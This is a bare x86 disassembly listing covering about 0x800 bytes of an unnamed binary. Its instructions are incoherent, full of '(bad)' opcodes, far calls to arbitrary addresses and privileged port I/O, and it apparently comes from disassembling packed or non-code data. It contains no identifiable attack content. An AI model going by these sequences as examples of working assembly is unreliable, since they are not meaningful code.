  41560e:	pop    eax
  41560f:	rcl    dh,0xc5
  415612:	mov    ah,0x97
  415614:	scas   al,BYTE PTR es:[edi]
  415615:	in     eax,0x35
  415617:	das    
  415618:	push   esp
  415619:	xchg   esp,eax
  41561a:	shr    BYTE PTR [ebx],1
  41561c:	and    al,0xb3
  41561e:	call   0xb72ecdf2
  415623:	dec    eax
  415624:	xchg   edi,eax
  415625:	mov    bl,0xa7
  415627:	dec    ebp
  415628:	pop    edx
  415629:	sar    ebx,0xaa
  41562c:	cmp    eax,0x929bd821
  415631:	ret    
  415632:	or     ch,ah
  415634:	das    
  415635:	pop    edx
  415636:	das    
  415637:	popf   
  415638:	aas    
  415639:	(bad)  
  41563a:	pop    ebp
  41563b:	inc    edi
  41563c:	ds ins BYTE PTR es:[edi],dx
  41563e:	dec    ecx
  41563f:	call   0xf84f:0xfb6713e2
  415646:	fs daa 
  415648:	retf   
  415649:	loopne 0x415659
  41564b:	lods   al,BYTE PTR ds:[esi]
  41564c:	cld    
  41564d:	and    al,BYTE PTR [edx-0x18]
  415650:	ss aam 0xf8
  415653:	sub    BYTE PTR [eax+0x7708d614],0x94
  41565a:	push   es
  41565b:	inc    eax
  41565c:	(bad)
  41565f:	sti    
  415660:	inc    ecx
  415661:	push   ds
  415662:	dec    ebx
  415663:	cmp    DWORD PTR [edx],edi
  415665:	push   esp
  415666:	call   0x794a:0x71560b69
  41566d:	ins    DWORD PTR es:[edi],dx
  41566e:	mov    ch,0x65
  415670:	jl     0x415660
  415672:	mov    eax,ds:0x62e64106
  415677:	(bad)  
  415678:	lahf   
  415679:	cs add al,0xf3
  41567c:	add    eax,0x5deb3de9
  415681:	add    esi,ebp
  415683:	mov    edx,0x61bf2cf5
  415688:	mov    eax,0x55f419f2
  41568d:	ret    
  41568e:	xor    edi,edx
  415690:	adc    BYTE PTR [ecx+0x5d],0x1
  415694:	ficomp WORD PTR [esp+edi*4+0x2a]
  415698:	outs   dx,BYTE PTR ds:[esi]
  415699:	arpl   WORD PTR [edi],cx
  41569b:	iret   
  41569c:	out    dx,al
  41569d:	add    eax,0x488abd7d
  4156a2:	adc    ebx,DWORD PTR [edi]
  4156a4:	popf   
  4156a5:	popf   
  4156a6:	or     edx,DWORD PTR [edi-0x53]
  4156a9:	rcr    DWORD PTR [ebx],cl
  4156ab:	in     al,0xf5
  4156ad:	push   ds
  4156ae:	repz push 0xffffff85
  4156b1:	mov    eax,0xf5fda885
  4156b6:	xchg   ebx,eax
  4156b7:	mov    esi,0x53e68e3f
  4156bc:	sbb    edi,ebx
  4156be:	lock mov ds:0xddb947c2,eax
  4156c4:	fs nop
  4156c6:	mov    ds,edx
  4156c8:	(bad)  
  4156c9:	in     eax,0xfa
  4156cb:	pop    ebx
  4156cc:	int    0xa6
  4156ce:	sub    BYTE PTR [ecx-0x58],cl
  4156d1:	jbe    0x4156ff
  4156d3:	data16 fcomip st,st(4)
  4156d6:	les    eax,FWORD PTR [ebp+ecx*1-0x7de6af96]
  4156dd:	out    0x28,al
  4156df:	xor    ch,BYTE PTR [esi]
  4156e1:	(bad)  
  4156e2:	std    
  4156e3:	ficomp WORD PTR [ebx]
  4156e5:	pop    eax
  4156e6:	aas    
  4156e7:	add    eax,0xf0a20a9a
  4156ec:	gs mov edi,0xe06a5e03
  4156f2:	cmp    edi,esp
  4156f4:	test   al,dl
  4156f6:	sti    
  4156f7:	jo     0x4156e1
  4156f9:	into   
  4156fa:	in     eax,dx
  4156fb:	or     bh,BYTE PTR [ecx]
  4156fd:	dec    esi
  4156fe:	ror    BYTE PTR [esp+edx*2+0x341c2834],cl
  415705:	add    esp,esp
  415707:	dec    ebx
  415708:	not    dl
  41570a:	adc    BYTE PTR [ebp+eiz*8+0x268fd7dc],al
  415711:	cmp    eax,0x7d368d83
  415716:	inc    esi
  415717:	cmp    al,BYTE PTR gs:[bp+di+0x48]
  41571c:	or     ch,BYTE PTR [edx+0x5dd3ae02]
  415722:	out    dx,al
  415723:	ins    BYTE PTR es:[edi],dx
  415724:	xchg   edi,eax
  415725:	xchg   BYTE PTR [edx-0x73],dh
  415728:	rcr    DWORD PTR [edx+0x17],cl
  41572b:	adc    BYTE PTR ds:0xe7e9d000,0xa5
  415732:	add    esi,DWORD PTR [edx]
  415734:	inc    eax
  415735:	mov    ds:0xf4223565,al
  41573a:	test   DWORD PTR [edx+0x6],edx
  41573d:	mov    dl,0x74
  41573f:	xor    ebx,DWORD PTR [ebp-0x68]
  415742:	pop    ss
  415743:	mov    dl,BYTE PTR [ecx]
  415745:	gs inc ebx
  415747:	push   ss
  415748:	das    
  415749:	sbb    BYTE PTR [edx+0x52613f1a],bl
  41574f:	xchg   BYTE PTR [ecx+0x49],al
  415752:	scas   eax,DWORD PTR es:[edi]
  415753:	mov    esp,fs
  415755:	jnp    0x41576c
  415757:	ja     0x4157cf
  415759:	adc    DWORD PTR [esi-0x1a],edx
  41575c:	jl     0x4156f4
  41575e:	xchg   edi,eax
  41575f:	jb     0x415762
  415761:	daa    
  415762:	ret    
  415763:	and    BYTE PTR [ebp+0x2ea3006],al
  415769:	ficom  WORD PTR [ecx+0x5c]
  41576c:	mov    dl,0x5a
  41576e:	repz inc esi
  415770:	je     0x415713
  415772:	dec    ebp
  415773:	imul   eax,DWORD PTR [ebx+ecx*8],0x6f
  415777:	retf   0x1f19
  41577a:	xlat   BYTE PTR ds:[ebx]
  41577b:	dec    esi
  41577c:	pushf  
  41577d:	dec    esp
  41577e:	jns    0x415770
  415780:	ficomp WORD PTR [esi-0x59]
  415783:	pop    esp
  415784:	jmp    0x4157e0
  415786:	ja     0x415741
  415788:	dec    ebp
  415789:	xlat   BYTE PTR ds:[ebx]
  41578a:	fwait
  41578b:	jle    0x4157a7
  41578d:	xchg   ah,dl
  41578f:	jecxz  0x4157b8
  415791:	inc    esi
  415792:	pop    ds
  415793:	fisub  DWORD PTR [ebx]
  415795:	push   esi
  415796:	push   ecx
  415797:	jns    0x415789
  415799:	scas   eax,DWORD PTR es:[edi]
  41579a:	sub    cl,BYTE PTR [ebp-0x64]
  41579d:	sahf   
  41579e:	nop
  41579f:	inc    ebx
  4157a0:	and    esp,esp
  4157a2:	jecxz  0x4157c4
  4157a4:	stos   BYTE PTR es:[edi],al
  4157a5:	in     eax,0x9c
  4157a7:	xchg   ebx,eax
  4157a8:	lods   al,BYTE PTR ds:[esi]
  4157a9:	ins    BYTE PTR es:[edi],dx
  4157aa:	xchg   edi,eax
  4157ab:	fidivr WORD PTR [ebx+ecx*1+0x26c3209b]
  4157b2:	xor    edx,DWORD PTR [edx]
  4157b4:	mov    ds:0x2a7c0bff,eax
  4157b9:	cmp    BYTE PTR [edi-0x72e98aaf],0xa0
  4157c0:	push   ds
  4157c1:	inc    ebx
  4157c2:	cmp    DWORD PTR [edx+ebx*1+0x38d3a7e5],eax
  4157c9:	in     al,dx
  4157ca:	les    ebp,FWORD PTR [ebx+0x71f58f1e]
  4157d0:	ins    DWORD PTR es:[edi],dx
  4157d1:	test   BYTE PTR [ecx+0x50],al
  4157d4:	js     0x4157aa
  4157d6:	pop    esp
  4157d7:	pushf  
  4157d8:	rcl    BYTE PTR [ebp+0x61c50bcd],cl
  4157de:	push   ecx
  4157df:	loope  0x415833
  4157e1:	push   edx
  4157e2:	arpl   WORD PTR [ecx+0x30],bp
  4157e5:	rcr    BYTE PTR [edx-0x47992f48],1
  4157eb:	mov    esp,0x8ee96704
  4157f0:	mov    bh,0xa3
  4157f2:	scas   al,BYTE PTR es:[edi]
  4157f3:	repz int 0x9c
  4157f6:	add    dh,dh
  4157f8:	stos   BYTE PTR es:[edi],al
  4157f9:	fldenv [ecx+0x7693e4de]
  4157ff:	cmc    
  415800:	test   DWORD PTR [ebx-0x9],ebx
  415803:	xlat   BYTE PTR ds:[ebx]
  415804:	xchg   esi,eax
  415805:	mov    ds:0xf3d35e17,al
  41580a:	fild   WORD PTR [ebx+0x35caf9b8]
  415810:	jbe    0x41584c
  415812:	aad    0xd0
  415814:	inc    eax
  415815:	pop    ecx
  415816:	dec    edi
  415817:	push   edx
  415818:	mov    gs,eax
  41581a:	loope  0x4157e8
  41581c:	aad    0xe6
  41581e:	xchg   edx,eax
  41581f:	(bad)  [ebp-0x6d0a84a5]
  415825:	cwde   
  415826:	lahf   
  415827:	cdq    
  415828:	imul   BYTE PTR [edx]
  41582a:	in     al,dx
  41582b:	cmp    eax,DWORD PTR [eax]
  41582d:	dec    ecx
  41582e:	fwait
  41582f:	call   0xa479:0xecebcba7
  415836:	aad    0x85
  415838:	inc    edx
  415839:	cmp    cl,BYTE PTR ds:0x7c27078d
  41583f:	ret    0x2965
  415842:	mov    ah,0xba
  415844:	test   DWORD PTR [ecx],edi
  415846:	and    BYTE PTR [eax+0x3c262a53],bl
  41584c:	test   al,0x35
  41584e:	adc    ebp,ebp
  415850:	mov    edx,edx
  415852:	addr16 lahf 
  415854:	mov    al,0x30
  415856:	dec    ecx
  415857:	dec    edi
  415858:	call   0x8b72273f
  41585d:	sub    al,0x34
  41585f:	call   0x8367:0x9ca89540
  415866:	test   eax,0x247f96d5
  41586b:	in     eax,dx
  41586c:	xchg   BYTE PTR [esi+0x1c],ch
  41586f:	cmp    eax,0x211724dc
  415874:	loope  0x41589e
  415876:	call   0x616c21d2
  41587b:	and    ebp,edi
  41587d:	lods   al,BYTE PTR ds:[esi]
  41587e:	stos   BYTE PTR es:[edi],al
  41587f:	pop    ebx
  415880:	call   0x5bd6:0xc3e48140
  415887:	dec    edx
  415888:	mov    bl,0x81
  41588a:	imul   ebx,DWORD PTR [edi-0x17],0xa31ecb4d
  415891:	pop    edi
  415892:	inc    esi
  415893:	loop   0x4158e7
  415895:	data16 (bad) 
  415897:	clc    
  415898:	ins    BYTE PTR es:[edi],dx
  415899:	pop    ds
  41589a:	addr16 push edi
  41589c:	sub    BYTE PTR [ebx],dl
  41589e:	lds    ebx,FWORD PTR [esi+edx*2]
  4158a1:	jg     0x41584c
  4158a3:	js     0x415850
  4158a5:	push   es
  4158a6:	les    ebx,FWORD PTR [edi-0x56]
  4158a9:	sahf   
  4158aa:	mov    gs,WORD PTR [ebx]
  4158ac:	cmp    esi,0xcbeb9bc1
  4158b2:	cmp    eax,0x10687637
  4158b7:	je     0x415913
  4158b9:	mov    ecx,0xc7c26383
  4158be:	fnstenv [ebp+0x51e1f990]
  4158c4:	add    ah,BYTE PTR [edx]
  4158c6:	push   0x61
  4158c8:	or     BYTE PTR [ebp+0x46e97858],bh
  4158ce:	and    eax,ebp
  4158d0:	xchg   esi,eax
  4158d1:	push   esp
  4158d2:	mov    eax,0xd61b09b6
  4158d7:	repnz and al,0x5b
  4158da:	add    al,0xe2
  4158dc:	or     eax,0xc90e895c
  4158e1:	scas   eax,DWORD PTR es:[edi]
  4158e2:	das    
  4158e3:	dec    eax
  4158e4:	out    dx,al
  4158e5:	jae    0x415909
  4158e7:	or     DWORD PTR [edi-0x42409033],esi
  4158ed:	pop    ds
  4158ee:	push   ss
  4158ef:	daa    
  4158f0:	jp     0x41593f
  4158f2:	xor    al,0xe0
  4158f4:	xchg   ebp,eax
  4158f5:	xchg   edi,eax
  4158f6:	enter  0xf0a8,0x93
  4158fa:	sub    DWORD PTR [edx+0x7a],edx
  4158fd:	dec    eax
  4158fe:	xchg   esi,eax
  4158ff:	dec    dx
  415901:	sbb    eax,0x737021ae
  415906:	out    0xb2,al
  415908:	or     edx,DWORD PTR [edx]
  41590a:	mov    WORD PTR [ebx],gs
  41590c:	sub    bl,BYTE PTR [ecx]
  41590e:	pop    ebp
  41590f:	mov    bl,0xe4
  415911:	loope  0x4158ad
  415913:	bnd ret 
  415915:	add    DWORD PTR [edi+0x55],edx
  415918:	hlt    
  415919:	jo     0x415942
  41591b:	mov    al,0x92
  41591d:	jnp    0x415942
  41591f:	pop    edx
  415920:	jb     0x415995
  415922:	pop    ebp
  415923:	mov    DWORD PTR [edi-0x1a],0xb7e670fc
  41592a:	in     al,0xa
  41592c:	xchg   BYTE PTR [ebx+0x312df767],cl
  415932:	dec    esi
  415933:	fcmovnb st,st(0)
  415935:	pop    edi
  415936:	cmp    dl,BYTE PTR [edi+0x171f3d91]
  41593c:	sar    BYTE PTR [esp+eax*4-0x34cb9be4],cl
  415943:	cli    
  415944:	in     eax,dx
  415945:	stc    
  415946:	mov    cl,0xd3
  415948:	scas   al,BYTE PTR es:[edi]
  415949:	sub    al,0xfa
  41594b:	jecxz  0x41595a
  41594d:	sbb    BYTE PTR [edi-0x55],0xcd
  415951:	fcomp  QWORD PTR [ecx-0x13]
  415954:	fisubr DWORD PTR [esi+0x7fc3c524]
  41595a:	pop    ebp
  41595b:	xor    bl,BYTE PTR [esi-0x4b]
  41595e:	out    0x73,al
  415960:	or     bl,dl
  415962:	sub    al,0x7b
  415964:	inc    eax
  415965:	dec    esi
  415966:	lods   al,BYTE PTR ds:[esi]
  415967:	inc    ebp
  415968:	clc    
  415969:	mov    ch,0xa2
  41596b:	mov    bl,0x55
  41596d:	mov    ah,0x9f
  41596f:	push   DWORD PTR [eax+0x52]
  415972:	popf   
  415973:	ds push ds
  415975:	sahf   
  415976:	aas    
  415977:	dec    BYTE PTR ss:[eax]
  41597a:	call   0x95e32e82
  41597f:	mov    bl,0x30
  415981:	dec    esi
  415982:	sub    DWORD PTR [ebx],ebx
  415984:	or     eax,esi
  415986:	cmp    bl,BYTE PTR ds:0xa5e3536c
  41598c:	jg     0x415a0d
  41598e:	fs mov dh,0x64
  415991:	(bad)  
  415992:	ret    
  415993:	push   es
  415994:	test   al,0xc5
  415996:	je     0x41595b
  415998:	stc    
  415999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599a:	test   eax,0x3bf8dfa6
  41599f:	retf   0x1f5a
  4159a2:	je     0x415972
  4159a4:	addr16 push edi
  4159a6:	jl     0x4159f2
  4159a8:	test   dl,cl
  4159aa:	xlat   BYTE PTR ds:[ebx]
  4159ab:	mov    ah,0x75
  4159ad:	scas   al,BYTE PTR es:[edi]
  4159ae:	test   BYTE PTR [esi],ch
  4159b0:	retf   0xabab
  4159b3:	mov    eax,ds:0xf239505d
  4159b8:	mov    bl,BYTE PTR [edi]
  4159ba:	dec    edi
  4159bb:	adc    eax,0x9a336c6e
  4159c0:	jbe    0x415a10
  4159c2:	mov    ecx,0xee018403
  4159c7:	nop
  4159c8:	mov    ebp,DWORD PTR [ebx-0x7c]
  4159cb:	and    ah,cl
  4159cd:	mov    edx,0xbf67513e
  4159d2:	mov    eax,ds:0xd2a1b6aa
  4159d7:	(bad)  
  4159d8:	out    dx,al
  4159d9:	jns    0x415964
  4159db:	dec    ebp
  4159dc:	inc    edx
  4159dd:	loope  0x415998
  4159df:	aam    0x49
  4159e1:	or     bh,bl
  4159e3:	or     DWORD PTR [ebx-0x6ee96e7c],edx
  4159e9:	mov    al,0xe1
  4159eb:	jl     0x415a15
  4159ed:	cld    
  4159ee:	inc    ecx
  4159ef:	sbb    ebx,DWORD PTR [ecx+0x78337b1c]
  4159f5:	mov    ds:0x3b14523,al
  4159fa:	mov    DWORD PTR [edx],esi
  4159fc:	out    0xfe,al
  4159fe:	xor    eax,0x45e28ad
  415a03:	sbb    edx,ebp
  415a05:	sar    BYTE PTR [ebx+0x2e],cl
  415a08:	pop    ebx
  415a09:	test   al,0xc5
  415a0b:	aam    0xe3
  415a0d:	call   0x63a9:0xc5a0367e
  415a14:	mul    BYTE PTR [edi+0x5ba534aa]
  415a1a:	into   
  415a1b:	dec    eax
  415a1c:	lahf   
  415a1d:	les    edx,FWORD PTR [eax+0x55]
  415a20:	fisttp WORD PTR [ecx+0x3c]
  415a23:	mov    esp,0x3f01631a
  415a28:	xchg   dh,dh
  415a2a:	add    dh,BYTE PTR [eax+0x4b33ad72]
  415a30:	in     eax,0x96
  415a32:	ss iret 
  415a34:	je     0x415a1f
  415a36:	cmp    eax,0xb961d900
  415a3b:	(bad)  
  415a3c:	cs cmp esi,edi
  415a3f:	(bad)  
  415a40:	in     eax,0x9
  415a42:	rcr    DWORD PTR [edx],1
  415a44:	lock lahf 
  415a46:	inc    esi
  415a47:	xchg   edx,eax
  415a48:	push   es
  415a49:	xchg   ebp,eax
  415a4a:	je     0x4159f0
  415a4c:	cwde   
  415a4d:	and    eax,0x6c02fb9
  415a52:	stc    
  415a53:	stos   BYTE PTR es:[edi],al
  415a54:	js     0x415a15
  415a56:	popf   
  415a57:	pop    edi
  415a58:	cmc    
  415a59:	cld    
  415a5a:	mul    DWORD PTR [esi-0x12]
  415a5d:	dec    esi
  415a5e:	int    0xfe
  415a60:	cwde   
  415a61:	add    BYTE PTR [ecx+ebp*8-0x474e02aa],0x6d
  415a69:	sub    eax,0x94e8d540
  415a6e:	ret    0x7226
  415a71:	sub    BYTE PTR [ebx],cl
  415a73:	xor    eax,0x6e135345
  415a79:	sbb    esi,DWORD PTR [ebx]
  415a7b:	mov    cs,edi
  415a7d:	xchg   esp,eax
  415a7e:	in     al,dx
  415a7f:	loopne 0x415ae6
  415a81:	inc    edi
  415a82:	lods   eax,DWORD PTR ds:[esi]
  415a83:	cmp    ecx,DWORD PTR [esp+ebx*1+0x14]
  415a87:	lods   al,BYTE PTR ds:[esi]
  415a88:	mov    esi,DWORD PTR [edx-0x61bc1ef0]
  415a8e:	push   ebx
  415a8f:	dec    eax
  415a90:	fwait
  415a91:	pop    ds
  415a92:	(bad)
  415a96:	arpl   WORD PTR [edi],dx
  415a98:	sahf   
  415a99:	jle    0x415a9d
  415a9b:	sub    bl,bl
  415a9d:	adc    al,0x4a
  415a9f:	jmp    0x415a5d
  415aa1:	call   0xbc11:0x4a03e913
  415aa8:	rcr    DWORD PTR [ebp-0x16],0x35
  415aac:	xchg   edi,eax
  415aad:	out    0xad,al
  415aaf:	mov    ds:0xced28dc6,eax
  415ab4:	jmp    0x4573a0d3
  415ab9:	es js  0x415a70
  415abc:	ret    
  415abd:	arpl   WORD PTR [ebx],cx
  415abf:	test   BYTE PTR [eax-0x75],ch
  415ac2:	adc    al,0xd7
  415ac4:	out    0x62,eax
  415ac6:	push   edx
  415ac7:	ret    
  415ac8:	mov    esp,0xcdf1da70
  415acd:	jo     0x415a88
  415acf:	stc    
  415ad0:	scas   al,BYTE PTR es:[edi]
  415ad1:	mov    edx,0x45e05a81
  415ad6:	xchg   ebx,eax
  415ad7:	sub    eax,0xfcad4152
  415adc:	and    DWORD PTR [esi],esp
  415ade:	int    0xbe
  415ae0:	std    
  415ae1:	daa    
  415ae2:	sub    DWORD PTR [ebx],edi
  415ae4:	sysexit 
  415ae6:	cwde   
  415ae7:	lods   eax,DWORD PTR ds:[esi]
  415ae8:	out    0x40,al
  415aea:	rol    BYTE PTR [ecx+0x9],cl
  415aed:	jo     0x415ab7
  415aef:	sti    
  415af0:	leave  
  415af1:	cmp    cx,WORD PTR [bx+0x10]
  415af6:	(bad)  
  415af8:	sti    
  415af9:	into   
  415afa:	mov    esi,DWORD PTR [eax-0x54]
  415afd:	inc    esi
  415afe:	cmp    ch,ah
  415b00:	and    eax,0xf3afabee
  415b05:	std    
  415b06:	xchg   ebx,eax
  415b07:	fst    DWORD PTR [ebp+0x3e]
  415b0a:	lods   al,BYTE PTR ds:[esi]
  415b0b:	dec    BYTE PTR [esi+0x30d22455]
  415b11:	xchg   esi,eax
  415b12:	loopne 0x415b1c
  415b14:	call   0xd7c9:0xc313010d
  415b1b:	leave  
  415b1c:	xchg   edx,eax
  415b1d:	push   0xdff39ce8
  415b22:	retf   0xb0df
  415b25:	rcl    BYTE PTR [ebx+0x9d41367],1
  415b2b:	cmp    al,cl
  415b2d:	ds inc ecx
  415b2f:	sub    dl,BYTE PTR [esi+0x3cf0afb5]
  415b35:	in     eax,dx
  415b36:	popa   
  415b37:	or     BYTE PTR [edi],bl
  415b39:	dec    eax
  415b3a:	js     0x415aeb
  415b3c:	jnp    0x415b58
  415b3e:	mov    bh,0xaf
  415b40:	xlat   BYTE PTR ds:[ebx]
  415b41:	outs   dx,DWORD PTR ds:[esi]
  415b42:	push   ds
  415b43:	lods   al,BYTE PTR ds:[esi]
  415b44:	pop    ecx
  415b45:	pop    ss
  415b46:	sbb    al,BYTE PTR [ebp+0x32]
  415b49:	ret    0x21ea
  415b4c:	push   ebp
  415b4d:	xchg   esp,eax
  415b4e:	stos   BYTE PTR es:[edi],al
  415b4f:	imul   esi,DWORD PTR [esi+0x7c6a9164],0xe3bb9a74
  415b59:	push   edi
  415b5a:	ret    
  415b5b:	pop    esp
  415b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b5d:	inc    eax
  415b5e:	sar    BYTE PTR [ebx+edx*8+0x20],1
  415b62:	cmp    eax,0x36ea2354
  415b67:	aad    0x36
  415b69:	ret    0x1f1c
  415b6c:	rol    BYTE PTR [ecx],0x88
  415b6f:	jne    0x415bb2
  415b71:	dec    edx
  415b72:	cmp    dh,BYTE PTR [ebx-0x27]
  415b75:	mov    esp,0xe36e7578
  415b7a:	les    ebp,FWORD PTR [ebx-0x7e7a4fb0]
  415b80:	fmul   QWORD PTR [edx-0x10]
  415b83:	adc    esp,eax
  415b85:	and    DWORD PTR [edx],edx
  415b87:	cli    
  415b88:	jecxz  0x415b98
  415b8a:	and    esp,DWORD PTR [ebx]
  415b8c:	jns    0x415b43
  415b8e:	jne    0x415bb3
  415b90:	mov    ch,0x97
  415b92:	jge    0x415be3
  415b94:	sbb    eax,0xb26d672
  415b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b9a:	xlat   BYTE PTR ds:[ebx]
  415b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b9c:	lahf   
  415b9d:	shl    BYTE PTR [edi+0xf06d941],cl
  415ba3:	add    BYTE PTR [esi+0x3d],cl
  415ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ba7:	call   0x9ec4582e
  415bac:	push   ds
  415bad:	pop    esi
  415bae:	cli    
  415baf:	sahf   
  415bb0:	lods   al,BYTE PTR ds:[esi]
  415bb1:	int    0xb4
  415bb3:	pop    es
  415bb4:	inc    esi
  415bb5:	ret    
  415bb6:	sub    ecx,ebx
  415bb8:	int3   
  415bb9:	cli    
  415bba:	mov    bh,0x72
  415bbc:	mov    ds:0x679b7cd8,eax
  415bc1:	xchg   esp,eax
  415bc2:	sbb    eax,DWORD PTR [esi+0x7626fa9b]
  415bc8:	pop    ebx
  415bc9:	(bad)  [esi]
  415bcb:	shl    DWORD PTR ds:0x4581f0d6,1
  415bd1:	inc    ecx
  415bd2:	or     DWORD PTR [ecx-0x78],edi
  415bd5:	sbb    al,0xe0
  415bd7:	jno    0x415b6b
  415bd9:	cmp    ebx,DWORD PTR [ebx-0x6151176c]
  415bdf:	jecxz  0x415b86
  415be1:	mov    esi,0x8ba7a66d
  415be6:	popf   
  415be7:	outs   dx,DWORD PTR ds:[esi]
  415be8:	out    0xae,al
  415bea:	jp     0x415bdb
  415bec:	jge    0x415bf0
  415bee:	imul   eax,esp,0x5eb43ef5
  415bf4:	pusha  
  415bf5:	mov    cl,0xe3
  415bf7:	push   es
  415bf8:	sub    DWORD PTR [eax],esi
  415bfa:	cmp    DWORD PTR [edi+0x74],esi
  415bfd:	sbb    al,0x10
  415bff:	push   ebx
  415c00:	add    bl,cl
  415c02:	int    0xd2
  415c04:	pop    ss
  415c05:	sub    eax,0xea7a6559
  415c0a:	mov    al,ds:0x5f4188ed
  415c0f:	sbb    BYTE PTR [eax],0xd4
  415c12:	stc    
  415c13:	inc    ecx
  415c14:	lods   al,BYTE PTR ds:[esi]
  415c15:	inc    edi
  415c16:	(bad)  
  415c17:	mul    DWORD PTR [esi-0x5]
  415c1a:	mov    WORD PTR [eax-0x7b],?
  415c1d:	call   0x3278:0xedfcfd75
  415c24:	hlt    
  415c25:	fadd   QWORD PTR [ecx+eiz*2+0x9f920f4]
  415c2c:	and    eax,0x37175db4
  415c31:	cmp    DWORD PTR [ecx-0x357a9714],edx
  415c37:	ins    DWORD PTR es:[edi],dx
  415c38:	cwde   
  415c39:	add    bh,BYTE PTR [edx-0x38]
  415c3c:	hlt    
  415c3d:	out    dx,al
  415c3e:	push   esi
  415c3f:	lahf   
  415c40:	mov    ah,0x9f
  415c42:	rcl    BYTE PTR ds:0xd8ba00ee,1
  415c48:	sub    DWORD PTR [edi-0x685fdeea],0xffffffe8
  415c4f:	les    eax,FWORD PTR [eax]
  415c51:	ja     0x415bd3
  415c53:	fisub  DWORD PTR [ecx+0xfbffd63]
  415c59:	(bad)  
  415c5a:	shl    DWORD PTR [ecx+0x2c3813ce],cl
  415c60:	sbb    DWORD PTR [edi-0x44a00424],ebx
  415c66:	in     al,0x39
  415c68:	scas   eax,DWORD PTR es:[edi]
  415c69:	add    BYTE PTR [ecx],ch
  415c6b:	xchg   BYTE PTR [ebx+0x4b62c120],cl
  415c71:	push   esi
  415c72:	push   edx
  415c73:	dec    esi
  415c74:	lods   al,BYTE PTR ds:[esi]
  415c75:	(bad)  
  415c76:	out    dx,al
  415c77:	shl    BYTE PTR [edi],1
  415c79:	jnp    0x415c77
  415c7b:	push   edi
  415c7c:	out    dx,al
  415c7d:	enter  0x383a,0x7f
  415c81:	jbe    0x415cd4
  415c83:	sbb    dl,BYTE PTR [edi-0x1c400f90]
  415c89:	imul   esi,DWORD PTR [esi+esi*2+0x23],0xffffffab
  415c8e:	es jno 0x415ced
  415c91:	fsubp  st(5),st
  415c93:	inc    ecx
  415c94:	cs inc edx
  415c96:	fmul   DWORD PTR [eiz*2-0x79d27dc6]
  415c9d:	sub    al,0xd0
  415c9f:	inc    ebx
  415ca0:	mov    ebp,ds
  415ca2:	loop   0x415cf0
  415ca4:	sub    ah,BYTE PTR [ebp+0x75]
  415ca7:	adc    BYTE PTR ds:0xd1119e3a,bl
  415cad:	fsub   st(5),st
  415caf:	dec    edi
  415cb0:	inc    esp
  415cb1:	cmp    DWORD PTR [ecx],0x54e236a4
  415cb7:	je     0x415cbb
  415cb9:	mov    bh,BYTE PTR [ecx]
  415cbb:	dec    esp
  415cbc:	adc    esp,DWORD PTR [esi+0x330cc119]
  415cc2:	cld    
  415cc3:	xor    al,0xc1
  415cc5:	push   cs
  415cc6:	call   esp
  415cc8:	arpl   WORD PTR [ecx+0x1cef6f32],ax
  415cce:	pop    edi
  415ccf:	push   esp
  415cd0:	in     al,0x67
  415cd2:	or     edi,esi
  415cd4:	mov    eax,0xfd6bafb8
  415cd9:	jno    0x415d3f
  415cdb:	pop    edx
  415cdc:	repz fxch st(1)
  415cdf:	pop    ds
  415ce0:	scas   al,BYTE PTR es:[edi]
  415ce1:	mov    BYTE PTR [eax],al
  415ce3:	or     eax,0xee81705f
  415ce8:	lea    ebx,[esi+0x1e]
  415ceb:	mov    esi,0xa299fc4b
  415cf0:	sbb    ah,bl
  415cf2:	les    esp,FWORD PTR [esp+edi*2-0x4e]
  415cf6:	out    0x27,eax
  415cf8:	into   
  415cf9:	lock fimul WORD PTR [edx+eiz*2]
  415cfd:	sub    ebx,DWORD PTR [ebp-0xf]
  415d00:	daa    
  415d01:	or     esp,DWORD PTR [ebp+0x18f67dfa]
  415d07:	sbb    DWORD PTR [esi-0x6a],ebx
  415d0a:	inc    edx
  415d0b:	sbb    ch,dh
  415d0d:	call   0x7618c4c5
  415d12:	rol    DWORD PTR [ebp+0x66],1
  415d15:	pop    ebp
  415d16:	or     BYTE PTR [ebx-0x24],dl
  415d19:	pop    edx
  415d1a:	and    esi,esi
  415d1c:	and    edx,DWORD PTR [edi]
  415d1e:	xchg   BYTE PTR [eax],ch
  415d20:	or     eax,0xe525ba7a
  415d25:	iret   
  415d26:	adc    DWORD PTR [edi+eiz*4],esp
  415d29:	push   ss
  415d2a:	mov    ebp,0xf573dcfc
  415d2f:	test   DWORD PTR [edx-0x45826247],edx
  415d35:	jge    0x415d38
  415d37:	iret   
  415d38:	pop    ebp
  415d39:	outs   dx,DWORD PTR ds:[esi]
  415d3a:	icebp  
  415d3b:	sahf   
  415d3c:	cdq    
  415d3d:	push   ds
  415d3e:	adc    esp,esi
  415d40:	out    dx,al
  415d41:	sbb    al,0x39
  415d43:	jns    0x415cf2
  415d45:	mov    bl,0x9c
  415d47:	das    
  415d48:	adc    bh,BYTE PTR [eax-0x4a5974f9]
  415d4e:	out    dx,eax
  415d4f:	outs   dx,DWORD PTR ds:[esi]
  415d50:	dec    edx
  415d51:	add    DWORD PTR [eax-0x79d9e82f],edx
  415d57:	mov    eax,ds:0xf14c73b6
  415d5c:	sub    esi,DWORD PTR [ebp+0x1a1a31cb]
  415d62:	sub    ch,ah
  415d64:	inc    ecx
  415d65:	pushf  
  415d66:	xor    DWORD PTR [esi],eax
  415d68:	cmp    cl,ah
  415d6a:	std    
  415d6b:	(bad)  
  415d6d:	pop    eax
  415d6e:	mov    edx,fs
  415d70:	jae    0x415d27
  415d72:	es jmp 0xfae40a78
  415d78:	aam    0x51
  415d7a:	pop    edx
  415d7b:	push   ebx
  415d7c:	leave  
  415d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d7e:	cmp    bl,BYTE PTR [esp+edi*2+0x79cce8fa]
  415d85:	push   es
  415d86:	push   es
  415d87:	int3   
  415d88:	dec    esp
  415d89:	out    dx,al
  415d8a:	or     ebp,DWORD PTR [ebp+0x34356305]
  415d90:	in     eax,0xca
  415d92:	mov    dh,0xfd
  415d94:	out    0x1d,al
  415d96:	cmp    al,0xa8
  415d98:	mov    eax,0xad107763
  415d9d:	push   ebp
  415d9e:	jae    0x415d55
  415da0:	jmp    0x415dab
  415da2:	mov    al,ds:0xc3e36b0a
  415da7:	lock mov ebp,0xf44594ad
  415dad:	nop
  415dae:	icebp  
